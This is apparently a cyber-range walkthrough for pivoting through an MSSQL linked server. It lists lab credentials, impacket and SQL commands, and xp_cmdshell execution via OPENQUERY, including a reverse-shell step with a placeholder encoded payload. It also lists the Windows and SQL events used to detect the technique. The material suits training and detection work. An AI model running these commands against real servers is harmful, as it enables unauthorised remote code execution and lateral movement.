# WT#040 — MSSQL Linked Server Hop

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.22 (mbr01) → 192.168.77.23 (mbr02) |
| **Domain** | child.cadre.local → range.local |
| **Starting Credential** | analyst_t1 / T13r_An@lyst! (or SA: s@_P@ssw0rd!L@b!) |
| **Tools Required** | impacket-mssqlclient |
| **Certifications** | OSCP+, CAPE |
| **MITRE ATT&CK** | T1550.003 |
| **Difficulty** | Medium |

## Prerequisites
- SQL Server on mbr01 has xp_cmdshell enabled
- Linked server "MBR02" configured pointing to mbr02 (range.local)
- Starting credential: analyst_t1 or SA on mbr01

## Attack Steps

### 1. Connect to mbr01 MSSQL
```powershell
impacket-mssqlclient child.cadre.local/analyst_t1:'T13r_An@lyst!'@192.168.77.22 -windows-auth
```

### 2. Enumerate linked servers
```sql
SELECT srvname, srvproduct, rpcout FROM master..sysservers;
SELECT * FROM OPENQUERY("MBR02", 'SELECT @@SERVERNAME AS target_server');
```

### 3. Execute commands via linked server hop
```sql
SELECT * FROM OPENQUERY("MBR02", 'SELECT 1; EXEC xp_cmdshell "whoami"');
```

```sql
SELECT * FROM OPENQUERY("MBR02", 'SELECT 1; EXEC xp_cmdshell "hostname"');
```

### 4. Reverse shell on mbr02
```sql
SELECT * FROM OPENQUERY("MBR02", 'SELECT 1; EXEC xp_cmdshell "powershell -enc <BASE64_REV_SHELL>"');
```

## Post-Exploitation Chain
MSSQL on mbr01 (child.cadre.local) → Linked server trust → Code execution on mbr02 (range.local)

## Telemetry Verification
- **Event 4688**: xp_cmdshell spawning cmd.exe on mbr02
- **SQL Server Error Log**: OPENQUERY execution against MBR02
- **Event 5156**: Network connection mbr01 → mbr02 (1433/tcp)

## Status
CONFIGURED
